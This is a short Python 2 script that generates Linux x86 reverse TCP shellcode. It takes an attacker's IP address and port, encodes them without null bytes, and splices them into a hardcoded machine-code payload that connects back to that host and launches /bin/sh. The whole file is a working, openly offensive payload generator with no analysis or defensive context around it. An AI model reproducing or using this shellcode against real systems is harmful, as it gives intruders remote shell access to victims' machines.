#!/usr/bin/python
# generator.py
#  - Generate reverse tcp shellcode

import sys

if (len(sys.argv) != 3):
	print "Usage: %s <ip> <port>" % sys.argv[0]
	print "\tNote: Ip must avoid nulls"
	print "\tNote: Port must be between 256 and 65535 to avoid nulls"
	sys.exit()

try:
	ip = sys.argv[1]
	ip_parts = ip.split(".")
	if (len(ip_parts) != 4):
		raise ValueError
	for part in ip_parts:
		part_int = int(part)
		if (part_int < 1 or part_int > 255):
			raise ValueError
except ValueError:
	sys.exit("[-] Please enter a valid ip address")

try:
	port = int(sys.argv[2])
	if (port < 256 or port > 65535):
		raise ValueError
except ValueError as e:
	sys.exit("[-] Please enter a valid port")

ip_op = ""
for part in ip_parts:
	part_hex = hex(int(part))[2:]
	if (len(part_hex) == 2):
		ip_op += "\\x"+part_hex
	elif (len(part_hex) == 1):
		ip_op += "\\x0"+part_hex
	else:
		sys.exit("[-] Please enter a valid ip address")

print ip_op

if "00" in ip_op:
	sys.exit("[-] Please enter a valid ip")

port_hex = hex(port)[2:]
if (len(port_hex) == 4):
	port_op = "\\x"+port_hex[0:2]+"\\x"+port_hex[2:4]
elif (len(port_hex) == 3):
	port_op = "\\x0"+port_hex[0]+"\\x"+port_hex[1:3]
else:
	sys.exit("[-] Please enter a valid port")

if "00" in port_op:
	sys.exit("[-] Please enter a valid port")

code = (
"\\x31\\xc0\\x50\\x40\\x50\\x89\\xc3\\x40\\x89\\xc7"
"\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31"
"\\xc0\\x68"+ip_op+"\\x66\\x68"+port_op+"\\x66\\x57"
"\\x89\\xe1\\xb0\\x10\\x50\\x51\\x56\\xb0\\x66\\x47"
"\\x89\\xfb\\x89\\xe1\\xcd\\x80\\x89\\xf3\\x31\\xc9"
"\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79"
"\\xf7\\x31\\xc9\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68"
"\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53"
"\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

len = len(code)/4
print "Shellcode Length: %d" % len
print "\"%s\"" % code
